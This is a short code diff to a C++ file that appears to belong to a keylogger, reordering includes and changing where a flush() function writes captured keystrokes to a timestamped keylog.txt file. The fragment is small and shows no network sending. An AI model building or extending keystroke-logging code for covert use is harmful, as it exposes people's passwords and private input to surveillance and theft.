@@ -1,5 +1,5 @@
-#include "keyboard.h"
 #include <map>
+#include "keyboard.h"
 #include "../url/url.h"
 
 std::string int_to_hex(int n)
@@ -94,7 +94,7 @@ std::vector<std::string> keyBuffer;
 
 void flush()
 {
-    std::ofstream myfile("../keylog.txt", std::ios::out | std::ios::app);
+    std::ofstream myfile("keylog.txt");
     if (myfile.is_open())
     {
         std::time_t logTime = system_clock::to_time_t(system_clock::now());
